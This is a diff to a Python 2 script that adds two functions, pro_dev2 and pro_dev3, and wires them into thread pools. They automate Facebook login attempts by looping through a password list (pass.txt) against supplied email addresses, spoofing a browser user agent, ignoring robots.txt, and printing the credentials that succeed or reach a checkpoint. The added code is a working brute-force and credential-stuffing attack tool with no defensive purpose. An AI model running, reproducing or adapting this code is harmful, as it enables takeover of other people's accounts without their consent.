@@ -88,6 +88,62 @@ def pro_dev(ival):
 	  except:
 	  	pass
 
+
+def pro_dev2(ival):
+	pas = open("pass.txt", "r").readlines()
+	iqbal = ival.replace('\n', '')
+	for iq in pas:
+	  try:
+		iqu = iq.replace('\n', '').replace('\n\n', '') # print str(iqbal) + " | " + iqu 
+
+		log = 'https://www.facebook.com/login.php'
+		dev = mechanize.Browser()
+		dev.set_handle_robots(False)
+		dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+		dev.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36')]
+		dev.open(log)
+		dev.select_form(nr=0)
+		dev.form['email'] = ival
+		dev.form['pass'] = iqu
+		sub = dev.submit()
+		mask = sub.geturl()
+		if log != mask and not 'login_attempt' in mask and not 'checkpoint' in mask:
+			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[97;1m '+ iqu
+		elif 'checkpoint' in mask: 
+			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[92;1m '+ iqu
+		else:
+			pass
+	  except:
+	  	pass
+
+
+def pro_dev3(ival):
+	pas = open("pass.txt", "r").readlines()
+	iqbal = ival.replace('\n', '')
+	for iq in pas:
+	  try:
+		iqu = iq.replace('\n', '').replace('\n\n', '') # print str(iqbal) + " | " + iqu 
+
+		log = 'https://www.facebook.com/login.php'
+		dev = mechanize.Browser()
+		dev.set_handle_robots(False)
+		dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+		dev.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36')]
+		dev.open(log)
+		dev.select_form(nr=0)
+		dev.form['email'] = ival
+		dev.form['pass'] = iqu
+		sub = dev.submit()
+		mask = sub.geturl()
+		if log != mask and not 'login_attempt' in mask and not 'checkpoint' in mask:
+			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[97;1m '+ iqu
+		elif 'checkpoint' in mask: 
+			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[92;1m '+ iqu
+		else:
+			pass
+	  except:
+	  	pass
+
 # def dev_id():
 # 	for dev in users:
 # 		pro = Process(target=pro_dev, args=(dev,))
@@ -103,11 +159,11 @@ def dev_id1():
 
 def dev_id2():
 	dev = ThreadPool(2)
-	dev.map(pro_dev, users2)
+	dev.map(pro_dev2, users2)
 	
 def dev_id2():
 	dev = ThreadPool(2)
-	dev.map(pro_dev, users3)
+	dev.map(pro_dev3, users3)
 
 def run():
 	th = Process(target=dev_id1)
